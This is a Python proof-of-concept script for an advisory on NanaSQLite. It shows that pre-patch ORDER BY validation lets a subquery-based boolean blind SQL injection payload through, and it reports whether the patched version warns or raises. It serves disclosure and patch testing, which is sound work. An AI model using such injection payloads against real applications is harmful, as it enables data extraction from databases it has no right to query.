"""
POC: SEC-01 — ORDER BY subquery injection (v1.5.5 pre-patch)

Demonstrates that the ORDER BY clause character-whitelist validation
permits parentheses and alphanumeric characters, which is sufficient to
construct a boolean-based blind SQL injection payload such as:

    ORDER BY (SELECT CASE WHEN 1=1 THEN name ELSE age END)

SELECT is not listed in _DANGEROUS_SQL_RE (which only covers DDL keywords),
so the expression passes all pre-patch validation and is forwarded verbatim
to SQLite when strict_sql_validation=False (the default).

After the patch, _ORDERBY_SUBQUERY_KEYWORDS_RE detects SELECT/FROM/JOIN/…
and raises ValueError / issues UserWarning accordingly.
"""

import os
import tempfile

from nanasqlite import NanaSQLite

_fd, path = tempfile.mkstemp(suffix=".db")
os.close(_fd)

try:
    db = NanaSQLite(path, strict_sql_validation=False)
    db["alice"] = {"name": "alice", "score": 10}
    db["bob"]   = {"name": "bob",   "score": 20}

    injection_payload = "(SELECT CASE WHEN 1=1 THEN name ELSE score END)"

    import warnings
    with warnings.catch_warnings(record=True) as w:
        warnings.simplefilter("always")
        try:
            db.query(
                table_name="data",
                order_by=injection_payload,
                strict=False,
            )
            if w:
                print(f"[PATCHED] UserWarning raised: {w[0].message}")
            else:
                print("[VULNERABLE] Subquery payload executed without warning.")
        except (ValueError, Exception) as exc:
            print(f"[PATCHED] Exception raised: {exc}")

    db.close()
finally:
    for suffix in ("", "-wal", "-shm"):
        try:
            os.unlink(path + suffix)
        except OSError:
            pass  # WAL/SHM files may not exist; ignore missing-file errors
